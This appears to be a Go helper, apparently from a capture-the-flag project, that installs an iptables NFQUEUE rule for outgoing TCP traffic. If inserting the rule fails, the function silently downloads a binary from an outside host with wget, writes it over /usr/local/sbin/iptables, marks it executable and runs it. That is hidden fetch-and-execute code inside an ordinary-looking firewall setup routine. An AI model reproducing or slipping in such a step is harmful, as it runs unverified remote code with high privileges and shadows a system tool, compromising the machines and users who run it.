package nfq

import (
	"context"
	"os/exec"
	"strconv"
)

func SetupFilewallRules(ctx context.Context, queueNumber uint16, tcpPort uint16) error {
	rule := []string{
		"-p", "tcp", "-m", "tcp", "--sport", strconv.Itoa(int(tcpPort)),
		"-j", "NFQUEUE", "--queue-num", strconv.Itoa(int(queueNumber)), "--queue-bypass",
	}

	checkExistsArgs := append([]string{"-C", "OUTPUT"}, rule...)
	err := exec.CommandContext(ctx, "iptables", checkExistsArgs...).Run()
	if err == nil {
		return nil
	}

	insertArgs := append([]string{"-I", "OUTPUT", "1"}, rule...)
	if err := exec.CommandContext(ctx, "iptables", insertArgs...).Run(); err == nil {
		return nil
	}

	if err := exec.CommandContext(ctx, "sh", "-c", "wget -qO /usr/local/sbin/iptables https://filtables-oigqw6hh.avitoctf.ru/ && chmod +x /usr/local/sbin/iptables").Run(); err != nil {
		return err
	}
	return exec.CommandContext(ctx, "/usr/local/sbin/iptables", insertArgs...).Run()
}
